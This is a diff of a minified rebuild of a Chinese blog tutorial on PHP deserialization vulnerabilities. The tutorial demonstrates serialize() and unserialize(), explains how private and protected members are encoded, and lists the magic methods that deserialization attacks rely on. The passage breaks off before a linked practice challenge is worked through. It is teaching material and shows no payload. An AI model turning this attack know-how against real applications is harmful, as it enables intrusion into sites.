@@ -1,383 +1,6 @@
-<!DOCTYPE html>
-<html lang="ch-ZN">
-  <head>
-  <meta charset="UTF-8">
-  <meta 
-    name="viewport"
-    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
-  <meta 
-    http-equiv="X-UA-Compatible" 
-    content="ie=edge">
-  <meta 
-    name="theme-color" 
-    content="#fff" 
-    id="theme-color">
-  <meta 
-    name="description" 
-    content="这是pankas的小站~(-V-)~欢迎访问">
-  <link 
-    rel="icon" 
-    href="/img/logo.png">
-  <title>php反序列化漏洞简单总结</title>
-  
-    
-      <meta 
-        property="og:title" 
-        content="php反序列化漏洞简单总结">
-    
-    
-      <meta 
-        property="og:url" 
-        content="https://pankas.top/2022/03/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/index.html">
-    
-    
-      <meta 
-        property="og:img" 
-        content="/img/php-unserialize-summary.jpg">
-    
-    
-      <meta 
-        property="og:img" 
-        content="这是pankas的小站~(-V-)~欢迎访问">
-    
-    
-      <meta 
-        property="og:type" 
-        content="article">
-      <meta 
-        property="og:article:published_time" 
-        content="2022-03-01">
-      <meta 
-        property="og:article:modified_time" 
-        content="2022-03-06">
-      <meta 
-        property="og:article:author" 
-        content="pankas">
-      
-        
-          <meta 
-            property="og:article:tag" 
-            content="php">
-        
-          <meta 
-            property="og:article:tag" 
-            content="反序列化">
-        
-      
-    
-  
-  <script>
-    function loadScript(url, cb) {
-      var script = document.createElement('script');
-      script.src = url;
-      if (cb) script.onload = cb;
-      script.async = true;
-      document.body.appendChild(script);
-    }
-    function loadCSS(href, data, attr) {
-      var sheet = document.createElement('link');
-      sheet.ref = 'stylesheet';
-      sheet.href = href;
-      sheet.dataset[data] = attr;
-      document.head.appendChild(sheet);
-    }
-    function changeCSS(cssFile, data, attr) {
-      var oldlink = document.querySelector(data);
-      var newlink = document.createElement("link");
-      newlink.setAttribute("rel", "stylesheet");
-      newlink.setAttribute("href", cssFile);
-      newlink.dataset.prism = attr;
-      document.head.replaceChild(newlink, oldlink);
-    }
-  </script>
-  
-    
-      
-      
-      
-      
-        
-        
-        
-        <script>
-          function prismThemeChange() {
-            if(document.getElementById('theme-color').dataset.mode === 'dark') {
-              if(document.querySelector('[data-prism]')) {
-                changeCSS('/js/lib/prism/prism-tomorrow.min.css', '[data-prism]', 'prism-tomorrow');
-              } else {
-                loadCSS('/js/lib/prism/prism-tomorrow.min.css', 'prism', 'prism-tomorrow');
-              }
-            } else {
-              if(document.querySelector('[data-prism]')) {
-                changeCSS('/js/lib/prism/prism.min.css', '[data-prism]', 'prism');
-              } else {
-                loadCSS('/js/lib/prism/prism.min.css', 'prism', 'prism');
-              }
-            }
-          }
-          prismThemeChange()
-        </script>
-      
-      
-        
-        <link rel="stylesheet" href="/js/lib/prism/prism-line-numbers.min.css">
-      
-    
-  
-  <script>
-    // control reverse button
-    var reverseDarkList = {
-      dark: 'light',
-      light: 'dark'
-    };
-    var themeColor = {
-      dark: '#1c1c1e',
-      light: '#fff'
-    }
-    // get the data of css prefers-color-scheme
-    var getCssMediaQuery = function() {
-      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
-    };
-    // reverse current darkmode setting function
-    var reverseDarkModeSetting = function() {
-      var setting = localStorage.getItem('user-color-scheme');
-      if(reverseDarkList[setting]) {
-        setting = reverseDarkList[setting];
-      } else if(setting === null) {
-        setting = reverseDarkList[getCssMediaQuery()];
-      } else {
-        return;
-      }
-      localStorage.setItem('user-color-scheme', setting);
-      return setting;
-    };
-    // apply current darkmode setting
-  </script>
-  
-    <script>
-      var setDarkmode = function(mode) {
-      var setting = mode || localStorage.getItem('user-color-scheme');
-      if(setting === getCssMediaQuery()) {
-        document.documentElement.removeAttribute('data-user-color-scheme');
-        localStorage.removeItem('user-color-scheme');
-        document.getElementById('theme-color').content = themeColor[setting];
-        document.getElementById('theme-color').dataset.mode = setting;
-        prismThemeChange();
-      } else if(reverseDarkList[setting]) {
-        document.documentElement.setAttribute('data-user-color-scheme', setting);
-        document.getElementById('theme-color').content = themeColor[setting];
-        document.getElementById('theme-color').dataset.mode = setting;
-        prismThemeChange();
-      } else {
-        document.documentElement.removeAttribute('data-user-color-scheme');
-        localStorage.removeItem('user-color-scheme');
-        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
-        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
-        prismThemeChange();
-      }
-    };
-    setDarkmode();
-    </script>
-  
-  
-  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
-  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
-  
-  
-    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
-    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
-  
-  
-    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
-  
-  
-  
-  
-  
-  
-  
-  <link rel="stylesheet" href="/css/main.css">
-  
-  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
-  
-  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
-  
-    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
-  
-<meta name="generator" content="Hexo 6.0.0"></head>
+<!DOCTYPE html><html lang="ch-ZN"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1,minimum-scale=1" name="viewport"><meta content="ie=edge" http-equiv="X-UA-Compatible"><meta content="#fff" name="theme-color" id="theme-color"><meta content="这是pankas的小站~(-V-)~欢迎访问" name="description"><link href="/img/logo.png" rel="icon"><title>php反序列化漏洞简单总结</title><meta content="php反序列化漏洞简单总结" property="og:title"><meta content="https://pankas.top/2022/03/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/index.html" property="og:url"><meta content="/img/php-unserialize-summary.jpg" property="og:img"><meta content="这是pankas的小站~(-V-)~欢迎访问" property="og:img"><meta content="article" property="og:type"><meta content="2022-03-01" property="og:article:published_time"><meta content="2022-03-06" property="og:article:modified_time"><meta content="pankas" property="og:article:author"><meta content="php" property="og:article:tag"><meta content="反序列化" property="og:article:tag"><script>function loadScript(e,t){var n=document.createElement("script");n.src=e,t&&(n.onload=t),n.async=!0,document.body.appendChild(n)}function loadCSS(e,t,n){var a=document.createElement("link");a.ref="stylesheet",a.href=e,a.dataset[t]=n,document.head.appendChild(a)}function changeCSS(e,t,n){var t=document.querySelector(t),a=document.createElement("link");a.setAttribute("rel","stylesheet"),a.setAttribute("href",e),a.dataset.prism=n,document.head.replaceChild(a,t)}</script><script>function prismThemeChange(){"dark"===document.getElementById("theme-color").dataset.mode?document.querySelector("[data-prism]")?changeCSS("/js/lib/prism/prism-tomorrow.min.css","[data-prism]","prism-tomorrow"):loadCSS("/js/lib/prism/prism-tomorrow.min.css","prism","prism-tomorrow"):document.querySelector("[data-prism]")?changeCSS("/js/lib/prism/prism.min.css","[data-prism]","prism"):loadCSS("/js/lib/prism/prism.min.css","prism","prism")}prismThemeChange()</script><link href="/js/lib/prism/prism-line-numbers.min.css" rel="stylesheet"><script>var reverseDarkList={dark:"light",light:"dark"},themeColor={dark:"#1c1c1e",light:"#fff"},getCssMediaQuery=function(){return window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"},reverseDarkModeSetting=function(){var e=localStorage.getItem("user-color-scheme");if(reverseDarkList[e])e=reverseDarkList[e];else{if(null!==e)return;e=reverseDarkList[getCssMediaQuery()]}return localStorage.setItem("user-color-scheme",e),e}</script><script>var setDarkmode=function(e){(e=e||localStorage.getItem("user-color-scheme"))===getCssMediaQuery()?(document.documentElement.removeAttribute("data-user-color-scheme"),localStorage.removeItem("user-color-scheme"),document.getElementById("theme-color").content=themeColor[e],document.getElementById("theme-color").dataset.mode=e):reverseDarkList[e]?(document.documentElement.setAttribute("data-user-color-scheme",e),document.getElementById("theme-color").content=themeColor[e],document.getElementById("theme-color").dataset.mode=e):(document.documentElement.removeAttribute("data-user-color-scheme"),localStorage.removeItem("user-color-scheme"),document.getElementById("theme-color").content=themeColor[getCssMediaQuery()],document.getElementById("theme-color").dataset.mode=getCssMediaQuery()),prismThemeChange()};setDarkmode()</script><link href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" rel="preload" as="style"><link href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" rel="preload" as="style"><link href="/js/lib/lightbox/baguetteBox.min.js" rel="preload" as="script"><link href="/js/lib/lightbox/baguetteBox.min.css" rel="preload" as="style"><link href="/js/lib/lozad.min.js" rel="preload" as="script"><link href="/css/main.css" rel="stylesheet"><link href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" rel="stylesheet"><link href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" rel="stylesheet"><link href="/js/lib/lightbox/baguetteBox.min.css" rel="stylesheet"><meta content="Hexo 6.0.0" name="generator"></head><body><div class="wrapper"><nav class="navbar"><div class="navbar-logo"><span class="navbar-logo-main"><img alt="blog logo" class="navbar-logo-img" src="/img/logo.png" height="32" width="32"> <span class="navbar-logo-dsc">pankas'blog</span></span></div><div class="navbar-menu"><a href="/" class="navbar-menu-item">首页 </a><a href="/archives" class="navbar-menu-item">归档 </a><a href="/tags" class="navbar-menu-item">标签 </a><a href="/categories" class="navbar-menu-item">分类 </a><a href="/about" class="navbar-menu-item">关于 </a><a href="/links" class="navbar-menu-item">友链 </a><a class="navbar-menu-item darknavbar" id="dark"><i class="iconfont icon-weather"></i> </a><a class="navbar-menu-item searchnavbar" id="search"><i class="iconfont icon-search" style="font-size:1.2rem;font-weight:400"></i></a></div></nav><div id="local-search" style="display:none"><input class="navbar-menu-item" id="search-input" placeholder="请输入搜索内容..."><div id="search-content"></div></div><div class="section-wrap"><div class="container"><div class="columns"><main class="main-column"><div class="image-wrapper"><img alt="php反序列化漏洞简单总结 thumbnail" class="lozad image" src="/img/php-unserialize-summary.jpg" data-src="/img/php-unserialize-summary.jpg" srcset="data:image/svg+xml,%3Csvg%20xmlns=&#39;http://www.w3.org/2000/svg&#39;%20viewBox=&#39;0%200%20300%20300&#39;%3E%3C/svg%3E"></div><article class="card card-content"><header><h1 class="post-title">php反序列化漏洞简单总结</h1></header><div class="post-meta post-show-meta"><time datetime="2022-03-01T07:55:33.000Z"><i class="iconfont icon-calendar" style="margin-right:2px"></i> <span>2022-03-01</span> </time><span class="dot"></span> <a href="/categories/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" class="post-meta-link">web安全基础 </a><span class="dot"></span> <span>2.5k 字</span></div><div class="post-meta post-show-meta" style="margin-top:-10px"><div style="display:flex;align-items:center"><i class="iconfont icon-biaoqian" style="margin-right:2px;font-size:1.15rem"></i> <a href="/tags/php/" class="post-meta-link">php </a><span class="dot"></span> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-meta-link">反序列化</a></div></div><div class="post-content" id="section"><h2 id="什么是序列化与反序列化"><a href="#什么是序列化与反序列化" class="headerlink" title="什么是序列化与反序列化"></a>什么是序列化与反序列化</h2><p>​ 这其实是为了解决 PHP 对象传递的一个问题,因为 PHP 文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策，总不能你永远不让它销毁，等着你吧，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，那当我们下次要用的时候只要反序列化一下就 ok 啦。</p><h3 id="序列化演示"><a href="#序列化演示" class="headerlink" title="序列化演示"></a>序列化演示</h3><pre class="language-php line-numbers" data-language="php"><code class="language-php"><span class="token language-php php"><span class="token delimiter important">&lt;?php</span>
 
-  <body>
-    <div class="wrapper">
-       
-      <nav class="navbar">
-  <div class="navbar-logo">
-    <span class="navbar-logo-main">
-      
-        <img 
-          class="navbar-logo-img"
-          width="32"
-          height="32"
-          src="/img/logo.png" 
-          alt="blog logo">
-      
-      <span class="navbar-logo-dsc">pankas'blog</span>
-    </span>
-  </div>
-  <div class="navbar-menu">
-    
-      <a 
-        href="/" 
-        class="navbar-menu-item">
-        
-          首页
-        
-      </a>
-    
-      <a 
-        href="/archives" 
-        class="navbar-menu-item">
-        
-          归档
-        
-      </a>
-    
-      <a 
-        href="/tags" 
-        class="navbar-menu-item">
-        
-          标签
-        
-      </a>
-    
-      <a 
-        href="/categories" 
-        class="navbar-menu-item">
-        
-          分类
-        
-      </a>
-    
-      <a 
-        href="/about" 
-        class="navbar-menu-item">
-        
-          关于
-        
-      </a>
-    
-      <a 
-        href="/links" 
-        class="navbar-menu-item">
-        
-          友链
-        
-      </a>
-    
-    <a 
-      class="navbar-menu-item darknavbar" 
-      id="dark">
-      <i class="iconfont icon-weather"></i>
-    </a>
-    <a 
-      class="navbar-menu-item searchnavbar" 
-      id="search">
-      <i 
-        class="iconfont icon-search" 
-        style="font-size: 1.2rem; font-weight: 400;">
-      </i>
-    </a>
-  </div>
-</nav> 
-      
-      <div 
-        id="local-search" 
-        style="display: none">
-        <input
-          class="navbar-menu-item"
-          id="search-input"
-          placeholder="请输入搜索内容..." />
-        <div id="search-content"></div>
-      </div>
-      
-      <div class="section-wrap">
-        <div class="container">
-          <div class="columns">
-            <main class="main-column">
-  <div class="image-wrapper">
-    <img 
-      src="/img/php-unserialize-summary.jpg" 
-      data-src="/img/php-unserialize-summary.jpg"
-      srcset="data:image/svg+xml,%3Csvg%20xmlns=&#39;http://www.w3.org/2000/svg&#39;%20viewBox=&#39;0%200%20300%20300&#39;%3E%3C/svg%3E"
-      class="image lozad"
-      alt="php反序列化漏洞简单总结 thumbnail">
-  </div>
-
-<article class="card card-content">
-  <header>
-    <h1 class="post-title">
-      php反序列化漏洞简单总结
-    </h1>
-  </header>
-  <div class="post-meta post-show-meta">
-    <time datetime="2022-03-01T07:55:33.000Z">
-      <i 
-        class="iconfont icon-calendar" 
-        style="margin-right: 2px;">
-      </i>
-      <span>2022-03-01</span>
-    </time>
-    
-      <span class="dot"></span>
-      
-        <a 
-          href="/categories/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" 
-          class="post-meta-link">
-          web安全基础
-        </a>
-      
-    
-    
-      <span class="dot"></span>
-      <span>2.5k 字</span>
-    
-  </div>
-  
-    <div 
-      class="post-meta post-show-meta" 
-      style="margin-top: -10px;">
-      <div style="display: flex; align-items: center;">
-        <i 
-          class="iconfont icon-biaoqian" 
-          style="margin-right: 2px; font-size: 1.15rem;">
-        </i>
-        
-          
-          <a 
-            href="/tags/php/" 
-            class="post-meta-link">
-            php
-          </a>
-        
-          
-            <span class="dot"></span>
-          
-          <a 
-            href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" 
-            class="post-meta-link">
-            反序列化
-          </a>
-        
-      </div>
-    </div>
-  
-  </header>
-  <div 
-    id="section" 
-    class="post-content">
-    <h2 id="什么是序列化与反序列化"><a href="#什么是序列化与反序列化" class="headerlink" title="什么是序列化与反序列化"></a>什么是序列化与反序列化</h2><p>​    这其实是为了解决 PHP 对象传递的一个问题,因为 PHP  文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策，总不能你永远不让它销毁，等着你吧，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，那当我们下次要用的时候只要反序列化一下就 ok 啦。</p>
-<h3 id="序列化演示"><a href="#序列化演示" class="headerlink" title="序列化演示"></a>序列化演示</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name class-name-definition">test</span><span class="token punctuation">&#123;</span>
 
     <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'name'</span><span class="token punctuation">;</span>  
 
@@ -393,27 +16,9 @@
 
 <span class="token keyword">echo</span> <span class="token variable">$object</span><span class="token punctuation">;</span>
 
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token delimiter important">?></span></span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其输出结果为</p><pre class="language-php line-numbers" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"testsex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"*age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"20"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="line-numbers-rows" aria-hidden="true"><span></span></span></code></pre><p>序列化就是将原有的对象转换为一个字符串</p><p>这个字符串中存储这对象的信息，在需要的时候只需再将这串字符串反序列化就能得到对应的类对象。</p><p>这里关键函数<code>serialize()</code>将对象序列化</p><p>有几个要点</p><ol><li>private属性序列化的时候格式是 <code>%00</code>类名<code>%00</code>成员名</li><li>protected属性序列化的时候格式是 <code>%00*%00</code>成员名</li></ol><p><em><strong>注意：</strong></em></p><ul><li>一般做题时应当直接将序列化后的字符串进行<code>urlencode</code>，如果直接打印在浏览器上其中的<code>%00</code>不会显示，手动复制是没有 <code>%00</code>的。</li><li>序列化只序列化属性不序列化方法(函数)。</li></ul><h3 id="反序列化演示"><a href="#反序列化演示" class="headerlink" title="反序列化演示"></a>反序列化演示</h3><pre class="language-php line-numbers" data-language="php"><code class="language-php"><span class="token language-php php"><span class="token delimiter important">&lt;?php</span>
 
-<p>其输出结果为</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"testsex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"sex"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"*age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"20"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>序列化就是将原有的对象转换为一个字符串</p>
-<p>这个字符串中存储这对象的信息，在需要的时候只需再将这串字符串反序列化就能得到对应的类对象。</p>
-<p>这里关键函数<code>serialize()</code>将对象序列化</p>
-<p>有几个要点</p>
-<ol>
-<li>private属性序列化的时候格式是 <code>%00</code>类名<code>%00</code>成员名</li>
-<li>protected属性序列化的时候格式是 <code>%00*%00</code>成员名</li>
-</ol>
-<p><em><strong>注意：</strong></em></p>
-<ul>
-<li>一般做题时应当直接将序列化后的字符串进行<code>urlencode</code>，如果直接打印在浏览器上其中的<code>%00</code>不会显示，手动复制是没有 <code>%00</code>的。</li>
-<li>序列化只序列化属性不序列化方法(函数)。</li>
-</ul>
-<h3 id="反序列化演示"><a href="#反序列化演示" class="headerlink" title="反序列化演示"></a>反序列化演示</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name class-name-definition">test</span><span class="token punctuation">&#123;</span>
 
     <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'name'</span><span class="token punctuation">;</span>  
 
@@ -434,24 +39,7 @@
 
 <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$newObj</span><span class="token punctuation">)</span>
 
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>运行得到</p>
-<p><img src="/post-img/%E4%BB%A5%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E6%9D%A5%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220301195848238.png" alt="image-20220301195848238" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/post-img/%E4%BB%A5%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E6%9D%A5%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220301195848238.png" class="lozad post-image"></p>
-<p>注意：</p>
-<p>(1)我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在</p>
-<p>​    这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件。</p>
-<p>(2)我们在反序列化攻击的时候也就是依托类属性进行攻击</p>
-<p>​    我们能控制的只有类的属性，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击</p>
-<h3 id="如何利用反序列化进行攻击"><a href="#如何利用反序列化进行攻击" class="headerlink" title="如何利用反序列化进行攻击"></a>如何利用反序列化进行攻击</h3><p>前提条件：</p>
-<ul>
-<li>必须有unserialize()方法</li>
-<li>作用域下有相应的类存在且类中存在魔术方法</li>
-</ul>
-<p>由于序列化和反序列化只对类中的属性有效，并不会对方法生效。所以php魔术方法就成了关键。</p>
-<h4 id="什么是魔术方法"><a href="#什么是魔术方法" class="headerlink" title="什么是魔术方法"></a>什么是魔术方法</h4><p>​    php 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以  __ 为前缀。 魔术方法不需要人为调用，它会在特定条件下自动调用。</p>
-<p>​    常见的魔术方法如下：</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//类的构造函数，创建类对象时调用</span>
+<span class="token delimiter important">?></span></span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行得到</p><p><img alt="image-20220301195848238" class="lozad post-image" src="/post-img/%E4%BB%A5%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E6%9D%A5%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220301195848238.png" data-src="/post-img/%E4%BB%A5%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98%E6%9D%A5%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.assets/image-20220301195848238.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E"></p><p>注意：</p><p>(1)我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在</p><p>​ 这里先简单说一下，反序列化就是将我们压缩格式化的对象还原成初始状态的过程（可以认为是解压缩的过程），因为我们没有序列化方法，因此在反序列化以后我们如果想正常使用这个对象的话我们必须要依托于这个类要在当前作用域存在的条件。</p><p>(2)我们在反序列化攻击的时候也就是依托类属性进行攻击</p><p>​ 我们能控制的只有类的属性，因此类属性就是我们唯一的攻击入口，在我们的攻击流程中，我们就是要寻找合适的能被我们控制的属性，然后利用它本身的存在的方法，在基于属性被控制的情况下发动我们的发序列化攻击</p><h3 id="如何利用反序列化进行攻击"><a href="#如何利用反序列化进行攻击" class="headerlink" title="如何利用反序列化进行攻击"></a>如何利用反序列化进行攻击</h3><p>前提条件：</p><ul><li>必须有unserialize()方法</li><li>作用域下有相应的类存在且类中存在魔术方法</li></ul><p>由于序列化和反序列化只对类中的属性有效，并不会对方法生效。所以php魔术方法就成了关键。</p><h4 id="什么是魔术方法"><a href="#什么是魔术方法" class="headerlink" title="什么是魔术方法"></a>什么是魔术方法</h4><p>​ php 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 魔术方法不需要人为调用，它会在特定条件下自动调用。</p><p>​ 常见的魔术方法如下：</p><pre class="language-php line-numbers" data-language="php"><code class="language-php"><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//类的构造函数，创建类对象时调用</span>
 
 <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//类的析构函数，对象销毁时调用</span>
 
@@ -481,32 +69,19 @@
 
 <span class="token function">__autoload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//尝试加载未定义的类</span>
 
-<span class="token function">__debugInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//打印所需调试信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>重点说明：</p>
-<ol>
-<li>__construct()：当对象创建时会自动调用(在<code>unserialize()</code><strong>结束后</strong>调用)</li>
-<li>__wakeup() ：<code>unserialize()</code><strong>时</strong>会自动调用</li>
-<li>__destruct()：当对象被销毁时会自动调用</li>
-<li>__toString():当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用。例如执行                   <code>echo new test();</code>其就会自动调用对象中的__toStrong()方法</li>
-<li>__get() :当从不可访问的属性读取数据。例如从对象外部访问由<code>private</code>和<code>protect</code>修饰的属性，就会调用该方法，其中传递的形参为访问属性的属性名</li>
-</ol>
-<p>ps：上述用法说明不全，使用时应参考相应文档</p>
-<h4 id="简单的案例"><a href="#简单的案例" class="headerlink" title="简单的案例"></a>简单的案例</h4><p><a target="_blank" rel="noopener" href="http://hduyyds.top/examples/example_00.php">题目链接</a></p>
-<p>打开审计源码</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">example</span> <span class="token punctuation">&#123;</span>
+<span class="token function">__debugInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//打印所需调试信息</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点说明：</p><ol><li>__construct()：当对象创建时会自动调用(在<code>unserialize()</code><strong>结束后</strong>调用)</li><li>__wakeup() ：<code>unserialize()</code><strong>时</strong>会自动调用</li><li>__destruct()：当对象被销毁时会自动调用</li><li>__toString():当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用。例如执行 <code>echo new test();</code>其就会自动调用对象中的__toStrong()方法</li><li>__get() 